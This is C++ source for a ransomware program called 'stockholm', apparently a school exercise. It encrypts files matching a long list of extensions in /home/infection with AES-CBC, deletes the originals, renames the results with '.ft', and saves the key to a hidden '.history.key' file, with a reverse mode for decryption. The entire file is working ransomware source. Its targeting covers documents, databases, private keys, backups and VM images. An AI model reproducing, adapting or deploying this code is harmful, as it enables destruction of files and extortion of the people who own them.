#include <iostream>
#include <string>
#include <random>
#include <fstream>
#include <dirent.h>
#include <cstdio>
#include <vector>
#include <algorithm>
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>
#include <cryptopp/filters.h>
#include <cryptopp/files.h>
#include <cryptopp/osrng.h>

using namespace CryptoPP;


bool silent = false;
std::string g_key;
std::vector<std::string> extensions = {
    ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem",
    ".odt", ".ott", ".sxw", ".stw", ".uot",
    ".3ds", ".max", ".3dm",
    ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2",
    ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6",
    ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm",
    ".myd", ".myi", ".ibd", ".mdf", ".ldf",
    ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat",
    ".ps1", ".vbs", ".vb", ".pl",
    ".dip", ".dch", ".sch", ".brd",
    ".jsp", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".sh",
    ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi",
    ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u",
    ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif",
    ".png", ".bmp", ".jpg", ".jpeg",
    ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar",
    ".bak", ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg",
    ".vmx", ".vmdk", ".vdi",
    ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg",
    ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb",
    ".eml", ".msg", ".ost", ".pst",
    ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx",
    ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm",
    ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"
};

std::string cat_ext(const std::string& filepath) {
    size_t pos = filepath.rfind(".");
    if (pos == std::string::npos) {
        return "isnotext";
    }
    return (filepath.substr(pos));
}

void display_help() {
    std::cout << "===>> Help Menu <<===" << std::endl;
    std::cout << "" << std::endl;
    std::cout << "No arg : juste encrypt all file in /home/username/infection/" << std::endl;
    std::cout << "" << std::endl;
    std::cout << "-help or -h : display the help" << std::endl;
    std::cout << "" << std::endl;
    std::cout << "-version or -v : show the version" << std::endl;
    std::cout << "" << std::endl;
    std::cout << "-reverse or -r : to uncrypt all file (send key in arg)" << std::endl;
    std::cout << "" << std::endl;
    std::cout << "-silent or -s : to mute the log" << std::endl;
    std::cout << "" << std::endl;
    std::cout << "===>> Help Menu <<===" << std::endl;
    exit(EXIT_SUCCESS);
}

void ft_error(std::string msg) {
    std::cerr << msg << std::endl;
    exit(EXIT_FAILURE);
}
void ft_log(std::string log) {
    if (silent == false)
        std::cout << "[LOG] >>> " << log << std::endl;
}


std::string generateKey() {
    int length = 16;
    static const char charset[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
    std::default_random_engine rng(std::random_device{}());
    std::uniform_int_distribution<> dist(0, sizeof(charset) - 2);

    std::string key;
    for (int i = 0; i < length; ++i)
        key += charset[dist(rng)];
    return key;
}

typedef void (* func)(std::string filepath);

void decrypt(std::string filepath) {
    if (filepath.size() < 3 || filepath.substr(filepath.size() - 3) != ".ft")
        return;
    byte key[AES::DEFAULT_KEYLENGTH];
    std::memcpy(key, g_key.data(), AES::DEFAULT_KEYLENGTH);

    std::ifstream file(filepath, std::ios::binary);
    if (!file) {
        ft_log(std::string("Can't open : ") + filepath);
    }

    byte iv[AES::BLOCKSIZE];
    file.read(reinterpret_cast<char*>(iv), AES::BLOCKSIZE);

    std::string encryptedData((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    try {
        CBC_Mode<AES>::Decryption decryptor;
        decryptor.SetKeyWithIV(key, sizeof(key), iv);

        std::string decrypted;
        StringSource ss(encryptedData, true,
            new StreamTransformationFilter(decryptor, new StringSink(decrypted))
        );

        if (std::remove(filepath.c_str()) != 0)
            ft_error(std::string("Crash : can't remove file (") + filepath + std::string(")"));
        filepath.erase(filepath.size() - 3);
        std::ofstream out(filepath);
        out << decrypted;
        out.close();
        ft_log("Decrypt : " + filepath);

    } catch (const Exception& e) {
        ft_error(std::string("Crypto++ error : ").append(e.what()));
    }
}

void encrypt(std::string filepath) {
    if (std::find(extensions.begin(), extensions.end(), cat_ext(filepath)) == extensions.end())
        return;
    byte key[AES::DEFAULT_KEYLENGTH];
    std::memcpy(key, g_key.data(), AES::DEFAULT_KEYLENGTH);
    AutoSeededRandomPool rng;
    byte iv[AES::BLOCKSIZE];
    rng.GenerateBlock(iv, sizeof(iv));

    try {
        CBC_Mode<AES>::Encryption encryptor;
        encryptor.SetKeyWithIV(key, sizeof(key), iv);

        FileSink fs((filepath + ".ft").c_str());
        fs.Put(iv, sizeof(iv));

        FileSource fsInput(filepath.c_str(), true,
            new StreamTransformationFilter(encryptor,
                new Redirector(fs)
            )
        );
        if (std::remove(filepath.c_str()) != 0)
            ft_error(std::string("Crash : can't remove file (") + filepath + std::string(")"));
        ft_log("Encrypt : " + filepath);
    } catch(const Exception& e) {
        ft_error(std::string("Crypto++ error : ").append(e.what()));
    }
    return;
}

void all_file(std::string directory, func F) {
    DIR* dir = opendir(directory.c_str());
    if (dir == nullptr)
        ft_error("Can't open directory");
    struct dirent* entry;
    while ((entry = readdir(dir)) != nullptr) {
        std::string filename = entry->d_name;

        if (filename == "." || filename == "..") continue;

        std::string filepath = directory + "/" + filename;

        F(filepath);
    }

    closedir(dir);
}

int main(int argc, char** argv) {
    g_key = generateKey();
    if (argc > 3)
        ft_error("Arguments error, please try : ./stockholm -h or -help");
    else if (argc == 1) {
        all_file("/home/infection", (func)encrypt);
        std::ofstream keyFile(".history.key");
        keyFile << g_key << std::endl;
        std::cout << "key set in file : .history.key" << std::endl;
        exit(EXIT_SUCCESS);
    }
    std::string arg = argv[1];
    if (arg == "-r" || arg == "-reverse") {
        if (argc != 3)
            ft_error("Arguments error, please try : ./stockholm -h or -help");
        g_key = argv[2];
        all_file("/home/infection", (func)decrypt);
        exit(EXIT_SUCCESS);
    } else if (argc > 2)
        ft_error("Arguments error, please try : ./stockholm -h or -help");
    if (arg == "-s" || arg == "-silent")
        silent = true;
    else if (arg == "-v" || arg == "-version")
        std::cout << ">>> Version : 0.1" << std::endl;
    else if (arg == "-h" || arg == "-help")
        display_help();
    all_file("/home/infection", (func)encrypt);
    std::ofstream keyFile(".history.key");
    keyFile << g_key << std::endl;
    std::cout << "key set in file : .history.key" << std::endl;

    return EXIT_SUCCESS;
}
